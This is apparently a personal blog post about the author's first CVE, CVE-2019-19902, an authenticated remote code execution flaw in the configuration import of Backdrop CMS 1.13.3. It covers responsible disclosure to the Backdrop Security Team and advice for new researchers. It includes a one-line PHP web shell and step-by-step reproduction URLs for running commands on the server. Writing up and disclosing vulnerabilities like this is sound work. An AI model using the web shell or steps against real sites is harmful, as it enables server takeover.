---
layout: post
title: "My First CVE: Remote Code Execution in Backdrop CMS (CVE-2019-19902)"
section: blog
---

### TL;DR  
In 2019, I discovered a <span class="highlight">critical Remote Code Execution (RCE)</span> vulnerability in <span class="highlight">Backdrop CMS v1.13.3</span>, stemming from an insecure configuration import feature. The CMS allowed `.tar.gz` files to be uploaded and extracted—even if they contained only PHP shells and no config files. This flaw enabled <span class="highlight">authenticated admin users</span> to gain code execution on the server. I <span class="highlight">responsibly disclosed</span> the issue to the Backdrop Security Team, who confirmed the bug, issued a fix, and assigned it <span class="highlight">CVE-2019-19902</span>. This blog shares the technical details and personal reflections from that journey.

---

## 🧭 The Beginning

Every security researcher remembers their <span class="highlight">first CVE</span>. For me, it was more than a vulnerability—it was a <span class="highlight">milestone</span> that validated my path in cybersecurity.

In late 2019, I had been actively exploring open-source platforms, looking for misconfigurations, insecure defaults, and overlooked flaws. Along with a fellow researcher, I turned my attention to <span class="highlight">Backdrop CMS</span>, an open-source project inspired by Drupal. Its niche adoption and familiar architecture made it a promising target for analysis.

What began as curiosity led to the discovery of a <span class="highlight">critical RCE vulnerability</span>—and ultimately to my first assigned CVE: <span class="highlight">CVE-2019-19902</span>.

---

## 🔍 The Vulnerability

Backdrop CMS allows administrators to import site configurations via compressed `.tar.gz` files. These archives are uploaded and extracted server-side into a hashed staging directory.

A prior security fix had attempted to prevent malicious file extraction by filtering out non-JSON files during import. However, I discovered a subtle bypass: <span class="highlight">if the archive contained only a PHP file and no JSON files at all</span>, the system <span class="highlight">still</span> extracted the archive.

That meant an admin user could upload a `.tar.gz` file containing a <span class="highlight">malicious PHP shell</span>, which would be saved on the server and accessible via a predictable path. By chaining this with a GET parameter (`?cmd=`), an attacker could achieve <span class="highlight">remote code execution</span>.

---

## 🧪 Exploitation Steps

Here’s a simplified reproduction flow (admin access required):

1. **Create a PHP Web Shell**  
    ```php
    <?php system($_GET['cmd']); ?>
    ```

2. **Compress the file**  
    ```bash
    tar -czf shell.tar.gz shell.php
    ```

3. **Login to the CMS as admin**

4. **Navigate to Configuration Management Import**  
    ```
    http://<site>/?q=admin/config/development/configuration/full
    ```

5. **Upload the tarball and click “Stage Import”**

6. **Visit the update info page to find the config directory hash**  
    ```
    http://<site>/core/update.php?op=info
    ```

7. **Access the web shell**  
    ```
    http://<site>/files/<hashed_directory>/staging/shell.php
    ```

8. **Execute commands remotely**  
    ```
    http://<site>/files/<hashed_directory>/staging/shell.php?cmd=id
    ```

Just like that, <span class="highlight">arbitrary commands</span> could be run on the target server.

---

## 📬 Responsible Disclosure

I documented the vulnerability thoroughly—with PoCs, reproduction steps, and even screenshots—and emailed the <span class="highlight">Backdrop Security Team</span>. The communication was led by <span class="highlight">Nate Lampton</span>, who initially couldn’t reproduce the issue because the patch worked for mixed-content archives (JSON + PHP), but not for <span class="highlight">PHP-only archives</span>.

After some follow-up emails, test cases, and discussions, they confirmed the issue. The fix was released on <span class="highlight">December 18, 2019</span>, and the vulnerability was assigned <span class="highlight">CVE-2019-19902</span>.

Here’s an excerpt from Nate’s response that meant a lot to me:

> “While our previous fix filtered out non-JSON files from uploaded archives, you discovered if the archive contains only the script payload (and no JSON files at all), then the archive files are expanded anyway.”

---

## 🔖 CVE Details

- **CVE ID**: [CVE-2019-19902](https://backdropcms.org/security/backdrop-sa-core-2019-016)  
- **Component**: Configuration Management  
- **Severity**: <span class="highlight">Critical</span>  
- **Impact**: <span class="highlight">Remote Code Execution (Authenticated)</span>  
- **Fixed In**: Backdrop CMS 1.14.2  
- **Advisory**: [Backdrop SA-CORE-2019-016](https://backdropcms.org/security/backdrop-sa-core-2019-016)

---

## 🎯 Reflections

Getting my first CVE wasn’t just a technical win—it was <span class="highlight">emotional validation</span>. It taught me a few powerful lessons:

- <span class="highlight">Edge cases matter.</span> The vulnerability bypassed a previous patch by targeting a rare, overlooked scenario.
- <span class="highlight">Persistence pays off.</span> From initial confusion to confirmation, I had to follow up multiple times, ensuring the issue wasn’t dismissed or misunderstood.
- <span class="highlight">Communication is critical.</span> A well-structured report with a clear PoC can accelerate collaboration with maintainers.
- <span class="highlight">You don’t need zero-days.</span> Even open-source platforms with small user bases can contain impactful bugs.

---

## 🙌 A Note to Fellow Researchers

If you’re just starting your journey in cybersecurity, here’s my advice:

- Explore <span class="highlight">open-source projects</span>. They're accessible, well-documented, and often under-tested.
- Focus on <span class="highlight">clarity over complexity</span>—great reports make an impact even if the bug seems “simple.”
- Practice <span class="highlight">responsible disclosure</span>. It builds your credibility and helps secure software used around the world.
- Your <span class="highlight">first CVE</span> might come from curiosity, not deep expertise. That’s okay. It’s a starting point, not a finish line.

---

## 💬 Final Thoughts

<span class="highlight">CVE-2019-19902</span> wasn’t just about a bug in Backdrop CMS—it was about <span class="highlight">believing</span> that I could contribute something meaningful to the security community. That belief turned into action, which turned into <span class="highlight">real-world impact</span>.

To this day, that moment reminds me why I do what I do. And if you're reading this, maybe it’ll be the push you need to chase your <span class="highlight">first CVE</span> too.